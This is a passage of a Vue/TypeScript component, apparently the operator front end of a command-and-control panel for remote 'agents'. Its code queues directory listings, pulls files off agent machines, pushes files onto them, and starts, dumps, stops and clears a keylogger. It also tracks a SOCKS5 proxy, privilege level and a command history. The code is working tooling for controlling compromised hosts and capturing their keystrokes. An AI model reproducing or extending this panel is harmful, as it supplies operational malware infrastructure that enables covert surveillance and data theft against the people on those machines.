const uploadFile   = ref<File|null>(null)
const uploadDest   = ref('')
const uploading    = ref(false)
const downloadPath = ref('')
const downloading  = ref(false)
const uploadInput  = ref<HTMLInputElement|null>(null)

async function listDir(path: string) {
  loadingFiles.value = true
  try {
    const resp = await commandApi.queue(agentId.value, { op: 'ls', path })
    const cmdId = resp.data?.data?.command_id
    if (cmdId) {
      let tries = 0
      const iv = setInterval(async () => {
        tries++
        const r = await commandApi.get(cmdId)
        const cmd = r.data?.data
        if (cmd?.status === 'completed' || cmd?.status === 'failed') {
          clearInterval(iv)
          if (cmd.output) {
            try {
              fileEntries.value = JSON.parse(cmd.output)
            } catch {
              fileEntries.value = cmd.output.split('\n')
                .filter(Boolean)
                .map(n => ({ name: n.trim(), is_dir: n.endsWith('\\') || n.endsWith('/') }))
            }
          }
        }
        if (tries > 30) clearInterval(iv)
      }, 1500)
    }
  } catch { /* ignore */ }
  finally { loadingFiles.value = false }
}

async function downloadFile(name: string) {
  const path = currentPath.value.replace(/\\$/, '') + '\\' + name
  downloadPath.value = path
  await doDownload()
}

async function doDownload() {
  if (!downloadPath.value || downloading.value) return
  downloading.value = true
  try {
    const r = await fileApi.download(agentId.value, downloadPath.value)
    const b64 = r.data?.data?.file_content
    if (b64) {
      const bin  = atob(b64)
      const arr  = new Uint8Array(bin.length)
      for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i)
      const blob = new Blob([arr])
      const url  = URL.createObjectURL(blob)
      const a    = document.createElement('a')
      a.href = url
      a.download = downloadPath.value.split(/[/\\]/).pop() || 'download'
      a.click()
      URL.revokeObjectURL(url)
      addLine('info', `Downloaded: ${downloadPath.value}`)
    }
  } catch { addLine('err', 'Download failed') }
  finally { downloading.value = false }
}

function onUploadSelect(e: Event) {
  uploadFile.value = (e.target as HTMLInputElement).files?.[0] || null
}

async function doUpload() {
  if (!uploadFile.value || !uploadDest.value || uploading.value) return
  uploading.value = true
  try {
    const buf = await uploadFile.value.arrayBuffer()
    const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)))
    await fileApi.upload(agentId.value, uploadDest.value, b64)
    addLine('info', `Uploaded ${uploadFile.value.name} → ${uploadDest.value}`)
    uploadFile.value = null
    uploadDest.value = ''
  } catch { addLine('err', 'Upload failed') }
  finally { uploading.value = false }
}

// ── Keylog ────────────────────────────────────────────────────────────────
const keylogRunning = ref(false)
const keylogOutput  = ref('')

async function klStart() {
  try {
    const r = await reconApi.keylogStart(agentId.value)
    const id = r.data?.data?.command_id
    keylogRunning.value = true
    addLine('info', `Keylogger started → ${id || 'ok'}`)
  } catch { addLine('err', 'Keylog start failed') }
}

async function klDump() {
  try {
    const r = await reconApi.keylogDump(agentId.value)
    const id = r.data?.data?.command_id
    if (id) pollResult(id, 'keylog_dump')
    addLine('info', `Keylog dump queued → ${id || 'ok'}`)
  } catch { addLine('err', 'Keylog dump failed') }
}

async function klStop() {
  try {
    const r = await reconApi.keylogStop(agentId.value)
    const id = r.data?.data?.command_id
    if (id) pollResult(id, 'keylog_stop')
    addLine('info', `Keylog stop queued → ${id || 'ok'}`)
  } catch { addLine('err', 'Keylog stop failed') }
}

async function klClear() {
  try {
    await reconApi.keylogClear(agentId.value)
    keylogOutput.value = ''
    addLine('info', 'Keylog buffer cleared')
  } catch { addLine('err', 'Keylog clear failed') }
}

// ── SOCKS5 status ─────────────────────────────────────────────────────────
const socks5Active = ref(false)
const socks5Addr   = ref('')

// ── Command history ───────────────────────────────────────────────────────
const agentCmds   = ref<Command[]>([])
const loadingCmds = ref(false)
const selectedCmd = ref<Command|null>(null)
const outputModal = ref<Command|null>(null)
const histFilter  = ref('')

const filteredCmds = computed(() => {
  if (!histFilter.value) return agentCmds.value
  return agentCmds.value.filter(c => c.status === histFilter.value)
})

async function fetchCommands() {
  loadingCmds.value = true
  try {
    const r = await commandApi.list({ agent_id: agentId.value, limit: 100 })
    agentCmds.value = r.data?.data?.commands || []
  } catch { /* ignore */ }
  finally { loadingCmds.value = false }
}

async function clearQueue() {
  if (!confirm('Clear all pending commands for this agent?')) return
  try {
    await commandApi.clearQueue(agentId.value)
    fetchCommands()
  } catch { /* ignore */ }
}

// ── Remove ────────────────────────────────────────────────────────────────
const confirmRemove = ref(false)
async function doRemove() {
  await agentStore.remove(agentId.value)
  router.push('/agents')
}

// ── Helpers ───────────────────────────────────────────────────────────────
function fmtSize(bytes?: number) {
  if (!bytes) return '—'
  if (bytes < 1024)     return `${bytes} B`
  if (bytes < 1048576)  return `${(bytes/1024).toFixed(1)} KB`
  return `${(bytes/1048576).toFixed(1)} MB`
}

function relTime(ts: string) {
  if (!ts) return '—'
  const sec = Math.floor((Date.now() - new Date(ts).getTime()) / 1000)
  if (sec < 5)     return 'just now'
  if (sec < 60)    return `${sec}s ago`
  if (sec < 3600)  return `${Math.floor(sec/60)}m ago`
  if (sec < 86400) return `${Math.floor(sec/3600)}h ago`
  return `${Math.floor(sec/86400)}d ago`
}

function fmtDate(ts: string) {
  if (!ts) return '—'
  return new Date(ts).toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' })
}

function duration(c: Command) {
  if (!c.created_at || !c.updated_at) return '—'
  const ms = new Date(c.updated_at).getTime() - new Date(c.created_at).getTime()
  if (ms < 0) return '—'
  if (ms < 1000) return `${ms}ms`
  return `${(ms/1000).toFixed(1)}s`
}

async function copyText(t: string) {
  await navigator.clipboard.writeText(t)
}

let refreshTimer: ReturnType<typeof setInterval>

onMounted(() => {
  fetchCommands()
  refreshTimer = setInterval(fetchCommands, 15_000)
})

onUnmounted(() => {
  clearInterval(refreshTimer)
  pollers.value.forEach(clearInterval)
})

watch(() => activeTab.value, (t) => {
  if (t === 'history') fetchCommands()
})
</script>

<style scoped>
.info-table { width: 100%; border-collapse: collapse; }
.info-table tr { border-bottom: 1px solid var(--border-muted); }
.info-table tr:last-child { border-bottom: none; }
.info-table td { padding: 6px 12px; font-size: 12px; }
.info-label { color: var(--text-muted); width: 80px; flex-shrink: 0; }

.priv-badge {
  font-size: 10px; font-weight: 600;
  padding: 2px 6px; border-radius: var(--r-full);
}
.priv-badge.admin { background: var(--orange-bg); color: var(--orange); }
.priv-badge.user  { background: var(--bg-overlay); color: var(--text-muted); }

.terminal {
  background: var(--bg-deep);
  font-family: var(--font-mono);
  font-size: 12px;
  min-height: 200px;
  max-height: 400px;
  overflow-y: auto;
  line-height: 1.6;
}
.term-line { display: flex; gap: 6px; margin: 1px 0; padding: 0 14px; }
.term-ts { color: var(--text-muted); min-width: 60px; font-size: 10px; padding-top: 1px; }
.term-prefix { width: 14px; flex-shrink: 0; }
.term-line.cmd .term-content { color: var(--cyan); }
.term-line.out .term-content { color: var(--text-primary); }
.term-line.err .term-content { color: var(--red); }
.term-line.info .term-content { color: var(--text-muted); }
.term-line.cmd .term-prefix { color: var(--cyan); }
.term-line.err .term-prefix { color: var(--red); }
.term-content { flex: 1; word-break: break-all; }

.clickable { cursor: pointer; }
.row-selected { background: var(--bg-overlay) !important; }
.form-label { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 3px; }
</style>
